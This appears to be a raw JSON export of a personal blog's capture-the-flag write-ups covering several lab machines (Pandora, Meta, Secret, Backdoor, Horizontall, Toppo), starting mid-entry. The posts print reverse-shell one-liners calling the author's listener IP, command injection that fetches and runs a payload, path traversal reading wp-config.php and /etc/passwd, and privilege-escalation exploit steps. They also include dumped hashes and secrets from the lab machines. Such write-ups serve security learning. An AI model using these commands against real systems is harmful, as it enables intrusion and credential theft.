id_usuario|s:6:&quot;daniel&quot;; | 1638793297 | | vntmpokca9aee53q48op3mesqs | id_usuario|s:6:&quot;daniel&quot;; | 1644502107 | +----------------------------+------------------------------------------------------+-------------+ | g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:”matt”;alert_msg|a:0:{}new_chat|b:0; You have to past it in the cookie. Refresh the page..And now you are matt, you can also take the admin cookie but someone else is playing with it,so it’s not working. I have to kill them. Oh, sorry ppl, it’s not working.Hummm, it’s working because I was logged in as admin, but I removed the cookie.One of them is logged as admin, he have to finish the box first I thinkSomeone is using chisel, I have to try this tool too.I think it’s like mu tunnel ssh. https://github.com/jpillora/chiselOk I will try later. As admin.Now I’m admin on the machine, I had to wait 2 hours. Download the revershellI’v downloaded a reversshell here:https://github.com/pentestmonkey/php-reverse-shell $ip &#x3D; &#39;10.10.15.27&#39;; &#x2F;&#x2F; CHANGE THIS $port &#x3D; 4648; &#x2F;&#x2F; CHANGE THIS Zip itzip -r php-reverse-shell.zip php-reverse-shell.php netcatnc -lvp 4648 Upload it I’m matt pandora_backupI can’t be admin on the webpage, it’s buggy.I leave this CTF.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Meta","slug":"CTF_Meta","date":"2022-02-02T02:15:02.000Z","updated":"2022-09-27T07:49:10.854Z","comments":true,"path":"/post/CTF_Meta.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Meta.html","excerpt":"","text":"hosts/etc/hosts10.10.11.140 artcorp.htb rustscanrustscan -a meta.htb --range 1-65000 PORT STATE SERVICE REASON 22&#x2F;tcp open ssh syn-ack 80&#x2F;tcp open http syn-ack wfuzzNothing with the dir listingBut with the sub listing I have this:https://infinitelogins.com/2020/09/02/bruteforcing-subdomains-wfuzz/ wfuzz -c -f sub-fighter -w Documents&#x2F;wordlist&#x2F;subdomains.lst -u &#39;http:&#x2F;&#x2F;artcorp.htb&#39; -H &quot;Host: FUZZ.artcorp.htb&quot; --hw 9000 |grep 200 dev01.artcorp.htb.I add it to my /etc/hosts. It’s an exif tool, to see the metadatas. Exploit exiffhttps://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/I found this website who can give cool infos.CVE-2021-22204https://github.com/convisolabs/CVE-2021-22204-exiftool Install exiftoolhttps://exiftool.org/install.html Install djvulibresudo pacman -S djvulibre Downloadgit clone https://github.com/convisolabs/CVE-2021-22204-exiftool.git Edit the fileip = ‘10.10.15.22’port = ‘4444’ Open the listenernc -nlvp 4444 BOOMMMMI upload the file and the shell pop. Exploit pwnkitIt’s not working. I think I have to get the user first. should also do a directory with all my tools and open the python http server when I need them. I need th go to sleep…","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Secret","slug":"CTF_Secret","date":"2022-01-30T23:29:02.000Z","updated":"2022-09-27T07:49:09.864Z","comments":true,"path":"/post/CTF_Secret.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Secret.html","excerpt":"","text":"/etc/hosts10.10.11.120 secret.htb nmapnmap -sV -p- 10.10.11.120 nmap is too slow I will try rust rustscanhttps://github.com/RustScan/RustScan rustscan -a secret.htb --range 1-10000 PORT STATE SERVICE REASON 22&#x2F;tcp open ssh syn-ack 80&#x2F;tcp open http syn-ack 3000&#x2F;tcp open ppp syn-ack nmap port 3000nmap -sV secret.htb -p 3000 PORT STATE SERVICE VERSION 3000&#x2F;tcp open http Node.js (Express middleware) fuzzffuf -w Documents&#x2F;wordlist&#x2F;directory-list-2.3-medium.txt -u http:&#x2F;&#x2F;secret.htb&#x2F;FUZZ docs [Status: 200, Size: 20720, Words: 6752, Lines: 487] api [Status: 200, Size: 93, Words: 12, Lines: 1] Docs [Status: 200, Size: 20720, Words: 6752, Lines: 487] API [Status: 200, Size: 93, Words: 12, Lines: 1] DOCS [Status: 200, Size: 20720, Words: 6752, Lines: 487] node.js api APIRegisterI’m gonna use a plugin to post my requests, you can do it with curl. Login I have a token. TokenThis is mu token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWY2Y2U1YzNiMTgxNTA0NjMxOGY5NjAiLCJuYW1lIjoicGVhbnV0IiwiZW1haWwiOiJyb290QHJvb3QuY29tIiwiaWF0IjoxNjQzNTY0NzY2fQ.s-jTYtdx1chd9m2XymrA_tDefcwOciKT8UHNS1H4qHk I have to decode the second part. echo &quot;eyJfaWQiOiI2MWY2Y2U1YzNiMTgxNTA0NjMxOGY5NjAiLCJuYW1lIjoicGVhbnV0IiwiZW1haWwiOiJyb290QHJvb3QuY29tIiwiaWF0IjoxNjQzNTY0NzY2fQ&quot; | base64 --decode &#123;&quot;_id&quot;:&quot;61f6ce5c3b1815046318f960&quot;,&quot;name&quot;:&quot;peanut&quot;,&quot;email&quot;:&quot;root@root.com&quot;,&quot;iat&quot;:1643564766&#125;base64: entrée incorrecte Maybe I can recreate the payload withdasith Download filehttp://secret.htb:3000/download/files.zip See historyhttps://git-scm.com/book/en/v2/Git-Basics-Viewing-the-Commit-History git log -p -2 -TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE+TOKEN_SECRET = secret And the more important.href=”https://www.youtube.com/watch?v=dQw4w9WgXcQ&quot;&gt;secure! this has everything to make ur project secure. Create the tokenyou have to change the name and set the secret in VERIFY SIGNATURE. Login as admin… where is my fucking FLag!!! In the git directoryI have something to do with logs, but I don’t know how to add a parameter.https://www.codegrepper.com/code-examples/javascript/req+query+params+expressNow I know lol. Add the parameter. Exploitcreate the payloadrs.sh bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.15.22&#x2F;4846 0&gt;&amp;1 Listennc -lvp 4846 Create a http server to download the payload.python2.7 -m SimpleHTTPServer Download the payloadhttp://secret.htb:3000/api/logs?file=;wget http://10.10.15.22:8000/rs.shYeah! Execute the payloadhttp://secret.htb:3000/api/logs?file=;bash rs.sh I have a shell as dashith. Get rootDownload the exploitOn my computerwget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;joeammond&#x2F;CVE-2021-4034&#x2F;main&#x2F;CVE-2021-4034.py On the targetwget http:&#x2F;&#x2F;10.10.15.22:8000&#x2F;pol.py Exploitpython3 pol.py It’s not finishThis exploit is a cheat code, it’s too easy and I want to learn. Smart enumwget http:&#x2F;&#x2F;10.10.15.22:8000&#x2F;lse.sh sh lse.sh LSE Version: 3.9 User: dasith User ID: 1000 Password: none Home: &#x2F;home&#x2F;dasith Path: &#x2F;usr&#x2F;bin:&#x2F;bin umask: 0022 Hostname: secret Linux: 5.4.0-89-generic Distribution: Ubuntu 20.04.3 LTS Architecture: x86_64 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( file system )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [!] fst020 Uncommon setuid binaries........................................ yes! --- &#x2F;opt&#x2F;count &#x2F;snap&#x2F;snapd&#x2F;13640&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine &#x2F;snap&#x2F;snapd&#x2F;13170&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine --- [*] fst100 Useful binaries................................................. yes! &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( network )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [*] net000 Services listening only on localhost............................ yes! &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( software )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [*] sof170 Can we access MongoDB databases without credentials?............ yes! ps auxps aux |grep mongo ps aux |grep mongo mongodb 863 0.3 1.8 982012 75084 ? Ssl 19:18 0:06 &#x2F;usr&#x2F;bin&#x2F;mongod --unixSocketPrefix&#x3D;&#x2F;run&#x2F;mongodb --config &#x2F;etc&#x2F;mongodb.conf dasith 9570 0.0 0.0 6432 676 ? S 19:55 0:00 grep --color&#x3D;auto mongo MongoDBhttps://stackoverflow.com/questions/24985684/mongodb-show-all-contents-from-all-collections Nice and short doc, I like it. dasith@secret:~&#x2F;local-web$ mongo And list the db. show dbs admin 0.000GB auth-web 0.000GB config 0.000GB local 0.000GB let’s use auth-web. use auth-web And show the collections, is it la tables? show collections db.users.find() &#123; &quot;_id&quot; : ObjectId(&quot;6131bf09c6c27d0b05c16691&quot;), &quot;name&quot; : &quot;theadmin&quot;, &quot;email&quot; : &quot;admin@admins.com&quot;, &quot;password&quot; : &quot;$2a$10$SJ8vlQEJYL2J673Xte6BNeMmhHBioLSn6&#x2F;wqMz2DKjxwQzkModUei&quot;, &quot;date&quot; : ISODate(&quot;2021-09-03T06:22:01.581Z&quot;), &quot;__v&quot; : 0 &#125; &#123; &quot;_id&quot; : ObjectId(&quot;6131bfb7c6c27d0b05c16699&quot;), &quot;name&quot; : &quot;user222&quot;, &quot;email&quot; : &quot;user@google.com&quot;, &quot;password&quot; : &quot;$2a$10$WmuQwihUQkzSrRoYakQdI.5hdjo820LNxSfEYATaBoTa&#x2F;QXJmEbDS&quot;, &quot;date&quot; : ISODate(&quot;2021-09-03T06:24:55.832Z&quot;), &quot;__v&quot; : 0 &#125; &#123; &quot;_id&quot; : ObjectId(&quot;6131d73387dee30378c66556&quot;), &quot;name&quot; : &quot;newuser&quot;, &quot;email&quot; : &quot;root@dasith.works&quot;, &quot;password&quot; : &quot;$2a$10$wnvh2al2ABafCszb9oWi&#x2F;.YIXHX4RrTUiWAIVUlv2Z80lkvmlIUQW&quot;, &quot;date&quot; : ISODate(&quot;2021-09-03T08:05:07.991Z&quot;), &quot;__v&quot; : 0 &#125; &#123; &quot;_id&quot; : ObjectId(&quot;613904ae8a27cb040c65de17&quot;), &quot;name&quot; : &quot;dasith&quot;, &quot;email&quot; : &quot;dasiths2v2@gmail.com&quot;, &quot;password&quot; : &quot;$2a$10$S&#x2F;GbYplKgIU4oFdTDsr2SeOJreht3UgIA0MdT7F50EtiBy7ymzFBO&quot;, &quot;date&quot; : ISODate(&quot;2021-09-08T18:45:02.187Z&quot;), &quot;__v&quot; : 0 &#125; &#123; &quot;_id&quot; : ObjectId(&quot;61faddebceb4af047698ceff&quot;), &quot;name&quot; : &quot;johnjohn&quot;, &quot;email&quot; : &quot;2d5b68c8@hax.com&quot;, &quot;password&quot; : &quot;$2a$10$u840Z7TxjF0lVjNmkYNQtOfTuQSBfV32i44FZaQ3Cnw3XcxlO5zSe&quot;, &quot;date&quot; : ISODate(&quot;2022-02-02T19:39:23.759Z&quot;), &quot;__v&quot; : 0 &#125; &#123; &quot;_id&quot; : ObjectId(&quot;61fae16eceb4af047698cf13&quot;), &quot;name&quot; : &quot;carambar&quot;, &quot;email&quot; : &quot;fb07a043@hax.com&quot;, &quot;password&quot; : &quot;$2a$10$4TevfjCfQqSxJhai7njib.&#x2F;hhadYUP7QHbwOEQXJr4O8AW3kWLTc.&quot;, &quot;date&quot; : ISODate(&quot;2022-02-02T19:54:22.118Z&quot;), &quot;__v&quot; : 0 &#125; &#123; &quot;_id&quot; : ObjectId(&quot;61fae1eeceb4af047698cf18&quot;), &quot;name&quot; : &quot;carambarcefef&quot;, &quot;email&quot; : &quot;e78ece86@hax.com&quot;, &quot;password&quot; : &quot;$2a$10$JSZCh0l9KK1m1fyxfsEFR.sN8adWvt5r.0QHHE52yVdbIceEgGLMy&quot;, &quot;date&quot; : ISODate(&quot;2022-02-02T19:56:30.893Z&quot;), &quot;__v&quot; : 0 &#125; Whruyyyyy!!!!!! Decrypt the password&#114;&#x6f;&#111;&#116;&#64;&#100;&#x61;&#x73;&#105;&#116;&#x68;&#x2e;&#x77;&#111;&#x72;&#x6b;&#115; this use is cool. $2a$10$wnvh2al2ABafCszb9oWi&#x2F;.YIXHX4RrTUiWAIVUlv2Z80lkvmlIUQW I can’t do it, it’s too hard. /opt/countI saw this program with the lse script.When you run it he ask a file to read and tell you this:I’m trying to read the root flag.The program can read it. HintI got the flag from a coredump file.Someone forgot to remove it.So I have to kill count. Spawn 2 shellOne shell with the /opt/countOne shelll to kill it In /var/crash we have this file: _opt_count.1000.crash apport-unpackhttps://askubuntu.com/questions/434431/how-can-i-read-a-crash-file-from-var-crash apport-unpack _opt_count.1000.crash &#x2F;tmp&#x2F;wruyyyyy &#96;&#96;&#96;&#96; And then: &#96;&#96;&#96;sh strings &#x2F;tmp&#x2F;wr*&#x2F;Cor* It’s over, it’s faster with polkit exploit.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Backdoor","slug":"CTF_Backdoor","date":"2022-01-29T21:19:25.000Z","updated":"2022-09-27T07:49:09.918Z","comments":true,"path":"/post/CTF_Backdoor.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Backdoor.html","excerpt":"","text":"hostssudo echo &quot;10.10.11.125 backdoor.htb&quot; &gt;&gt; &#x2F;etc&#x2F;hosts nmapnmap -A -p- 10.10.11.125 PORT STATE SERVICE VERSION 22&#x2F;tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA) | 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA) |_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519) 80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache&#x2F;2.4.41 (Ubuntu) |_http-generator: WordPress 5.8.1 |_http-title: Backdoor &amp;#8211; Real-Life Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel It’s a wordpress website. wpscanwpscan --url http:&#x2F;&#x2F;backdoor.htb&#x2F; User wbhttp:&#x2F;&#x2F;backdoor.htb&#x2F;?author&#x3D;1 CVE-2016-10924??? pochttps://www.exploit-db.com/exploits/39575 wp-confighttp://10.10.11.125:80/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php Mysql passdefine( ‘DB_PASSWORD’, ‘MQYBJSaD#DxG6qbm’ ); /etc/passwdcurl http:&#x2F;&#x2F;backdoor.htb&#x2F;wp-content&#x2F;plugins&#x2F;ebook-download&#x2F;filedownload.php\\?ebookdownloadurl&#x3D;&#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;passwd&#x2F;etc&#x2F;passwd&#x2F;etc&#x2F;passwdroot:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin systemd-network:x:100:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin systemd-resolve:x:101:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin _apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin tss:x:106:111:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false uuidd:x:107:112::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin tcpdump:x:108:113::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin landscape:x:109:115::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin pollinate:x:110:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false usbmux:x:111:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin sshd:x:112:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin user:x:1000:1000:user:&#x2F;home&#x2F;user:&#x2F;bin&#x2F;bash lxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false mysql:x:113:118:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false &lt;script&gt;window.close()&lt;&#x2F;script&gt;% Directory traversall bloghttps://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/ This one gonna help me to exploit the machine.There is 3 exemples, this one sound good./proc/[PID]/cmdline http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\\?ebookdownloadurl=/proc/1/cmdline I don’t know how to use burpsuite, I’m gonna create a script. i=1 while ((i&lt;1000)) do echo $i curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\\?ebookdownloadurl=/proc/$i/cmdline >> pid.txt ((i=i+1)) done I forgot it put the \\n for each lines but it works. gdbserverAhaha I just need a sheel and I’m root. exploit gdb serverhttps://www.exploit-db.com/exploits/50539 help &#x3D; f&#39;&#39;&#39; Usage: python3 &#123;sys.argv[0]&#125; &lt;gdbserver-ip:port&gt; &lt;path-to-shellcode&gt; Example: - Victim&#39;s gdbserver -&gt; 10.10.10.200:1337 - Attacker&#39;s listener -&gt; 10.10.10.100:4444 1. Generate shellcode with msfvenom: $ msfvenom -p linux&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;10.10.10.100 LPORT&#x3D;4444 PrependFork&#x3D;true -o rev.bin 2. Listen with Netcat: $ nc -nlvp 4444 3. Run the exploit: $ python3 &#123;sys.argv[0]&#125; 10.10.10.200:1337 rev.bin &#39;&#39;&#39; This is what you have to do.It was hard to connect to the server, I had lot of errors.I was drooling on my keyboard while i thought about what i could do next. And I’m in. Exploit pwnkitThis exploit is so good.We don’t have gcc on the target machine so I’m gonna use python. Download thee exploit on my computermkdir exp cd exp wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;joeammond&#x2F;CVE-2021-4034&#x2F;main&#x2F;CVE-2021-4034.py python2.7 -m SimpleHTTPServer Download on the target from my computerwget 10.10.14.119:8000&#x2F;CVE-2021-4034.py eploitpython3 CVE-2021-4034.py id","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Horizontall","slug":"CTF_Horizontall","date":"2022-01-23T19:42:51.000Z","updated":"2022-09-27T07:49:11.118Z","comments":true,"path":"/post/CTF_Horizontall.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Horizontall.html","excerpt":"","text":"DescriptionHorizontal from HTB. nmapnmap -sV -p- 10.10.11.105 22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 80&#x2F;tcp open http nginx 1.14.0 (Ubuntu) Port 80It’s forbiden, I have to add the dns: &#x2F;etc&#x2F;hosts 10.10.11.105 horizontall.htb JavascriptThe file /js/app.c68eb462.js is obfuscated I have to use a tool to read it.https://lelinhtinh.github.io/de4js/I found the link http://api-prod.horizontall.htb/reviewsI have to add it to my /etc/hosts file. gobustergobuster dir -u http:&#x2F;&#x2F;api-prod.horizontall.htb&#x2F; -w Documents&#x2F;wordlist&#x2F;directory-list-2.3-small.txt -t 150 --wildcard switch | grep &quot;(Status:&quot; &#x2F;admin (Status: 200) [Size: 854] &#x2F;users (Status: 403) [Size: 60] &#x2F;reviews (Status: 200) [Size: 507] &#x2F;Reviews (Status: 200) [Size: 507] &#x2F;Users (Status: 403) [Size: 60] &#x2F;Admin (Status: 200) [Size: 854] &#x2F;REVIEWS (Status: 200) [Size: 507] In admin we have the login page to strapiIn reviews we have a json file. exploit strapihttps://www.exploit-db.com/exploits/50239 python3 50239.py http:&#x2F;&#x2F;api-prod.horizontall.htb The shell is broken but we have the creds. [+] Password reset was successfully [+] Your email is: admin@horizontall.htb [+] Your new credentials are: admin:SuperStrongPassword1 One week later… Ok, the credentials are useless, I have to use the blind RCE, On my computer: nc -nlvp 4242 Blind RCE: rm &#x2F;tmp&#x2F;f;mknod &#x2F;tmp&#x2F;f p;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.14.214 4242 &gt;&#x2F;tmp&#x2F;f And I’m in. Strapi shellIn /home/developer/user.txt:e6cb8f6f0831dc40507c330d548ea384 exploitUploadLook at this boy, it’s so cool dragon * MakeThis is a new exploit, released 2 days ago.https://github.com/berdav/CVE-2021-4034 I’m using dragon to drag and drop my files. cat &#x2F;root&#x2F;root.txt 373da3c143300dec7f9357b24c8b202a I really feel like a god xD Every computer are vulnerable, you have to update your system, When I’v started the box the exploit was not availible.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Toppo","slug":"CTF_Toppo","date":"2022-01-22T16:54:42.000Z","updated":"2022-09-27T07:49:09.981Z","comments":true,"path":"/post/CTF_Toppo.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Toppo.html","excerpt":"","text":"DescriptionThe Machine isn&#39;t hard to own and don&#39;t require advanced exploitation . Level : Beginner DHCP : activated Inside the zip you will find a vmdk file , and I think you will be able to use it with any usual virtualization software ( tested with Virtualbox) . If you have any question : my twitter is @h4d3sw0rm Happy Hacking ! Netdiscover192.168.0.43 nmap➜ ~ nmap -sV -p- 192.168.0.43 Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-22 10:58 CET Nmap scan report for 192.168.0.43 Host is up (0.011s latency). Not shown: 65531 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22&#x2F;tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) 80&#x2F;tcp open http Apache httpd 2.4.10 ((Debian)) 111&#x2F;tcp open rpcbind 2-4 (RPC #100000) 56317&#x2F;tcp open status 1 (RPC #100024) Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; . Nmap done: 1 IP address (1 host up) scanned in 17.26 seconds 22, 80, 111, 56317 Port 80Nikto+ OSVDB-3268: &#x2F;admin&#x2F;: Directory indexing found. + OSVDB-3092: &#x2F;admin&#x2F;: This might be interesting... + OSVDB-3268: &#x2F;img&#x2F;: Directory indexing found. + OSVDB-3092: &#x2F;img&#x2F;: This might be interesting... + OSVDB-3268: &#x2F;mail&#x2F;: Directory indexing found. + OSVDB-3092: &#x2F;mail&#x2F;: This might be interesting... + OSVDB-3092: &#x2F;manual&#x2F;: Web server manual found. + OSVDB-3268: &#x2F;manual&#x2F;images&#x2F;: Directory indexing found. In the admin directory we have one file, notes.txt: Note to myself : I need to change my password :&#x2F; 12345ted123 is too outdated but the technology isn&#39;t my thing i prefer go fishing or watching soccer . Password: 12345ted123 Port 22ssh with the password ssh ted@192.168.0.43. ssh ted@192.168.0.43 I’m in lse.shwget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;diego-treitos&#x2F;linux-smart-enumeration&#x2F;master&#x2F;lse.sh chmod +x lse.sh .&#x2F;lse.sh And this is what I found interesting: Hostname: Toppo Linux: 3.16.0-4-586 Distribution: Debian GNU&#x2F;Linux 8.10 (jessie) Architecture: i686 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( file system )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [*] fst000 Writable files outside user&#39;s home.............................. yes! [*] fst010 Binaries with setuid bit........................................ yes! [!] fst020 Uncommon setuid binaries........................................ yes! --- &#x2F;usr&#x2F;bin&#x2F;python2.7 &#x2F;usr&#x2F;bin&#x2F;mawk --- [!] fst030 Can we write to any setuid binary?.............................. yes! --- &#x2F;usr&#x2F;bin&#x2F;python2.7 --- That’s all. Let’s see what we can do with python. gtfobinhttps://gtfobins.github.io/gtfobins/python/ ted@Toppo:&#x2F;home$ python Python 2.7.9 (default, Aug 13 2016, 16:41:35) [GCC 4.9.2] on linux2 Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information. &gt;&gt;&gt; import os; os.system(&quot;&#x2F;bin&#x2F;sh&quot;) # id uid&#x3D;1000(ted) gid&#x3D;1000(ted) euid&#x3D;0(root) 